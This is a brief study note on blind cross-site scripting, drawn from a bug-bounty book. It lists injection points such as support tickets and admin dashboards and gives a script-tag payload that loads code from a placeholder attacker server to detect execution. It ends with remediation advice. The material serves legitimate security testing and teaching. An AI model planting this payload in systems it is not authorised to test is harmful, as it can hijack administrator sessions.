# Blind XSS

- What it is: Stored XSS that executes in a different or hidden application context you cannot directly view.
- Where to look: Support tickets, contact forms, analytics, logs, moderation queues, and admin-only dashboards.
- Because reflection is invisible, use a callback payload to detect execution:
```html
<script src='http://YOUR_SERVER_IP/xss'></script>
```
- Submit the payload through likely back-office data paths.
- Monitor the controlled server for a request to `/xss`.
- A callback indicates that another browser rendered and executed the stored input.
- High-value cases often execute in administrator sessions.
- False-positive/edge note: A server-side fetch is not proof of browser JavaScript execution; inspect request characteristics when possible.
- Remediation: Encode all untrusted data in internal/admin interfaces, not only public pages.

## Source: Bug Bounty Bootcamp, Ch. 6
